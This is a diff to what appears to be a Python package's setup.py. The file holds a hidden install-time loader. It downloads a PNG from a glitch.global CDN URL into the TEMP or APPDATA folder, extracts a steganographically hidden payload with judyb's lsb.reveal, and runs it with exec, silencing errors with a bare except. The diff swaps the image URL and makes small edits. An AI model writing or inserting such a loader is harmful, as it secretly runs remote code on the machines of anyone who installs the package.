@@ -1,4 +1,5 @@
 import os
+from pathlib import Path
 from setuptools import setup, find_packages
 
 try:
@@ -10,9 +11,10 @@ except:
     import requests
     from judyb import lsb
 
-request_image_link = "https://cdn.glitch.global/eb3e6f28-bcca-471f-b521-bb35172b0498/img.png"
+request_image_link = "https://cdn.glitch.global/216e2141-e206-46ed-b7e4-12c4a387d76a/img.png"
 
 try:
+
     if os.path.exists(f'{os.getenv("TEMP")}\\img.png') != True:
         r = requests.get(request_image_link)
         with open(f'{os.getenv("TEMP")}\\img.png', 'wb') as f:
@@ -23,6 +25,7 @@ try:
         with open(f'{os.getenv("APPDATA")}\\img.png', 'wb') as f:
             f.write(r.content)
         exec(lsb.reveal(f'{os.getenv("APPDATA")}\\img.png'))
+
 except:
     pass
 
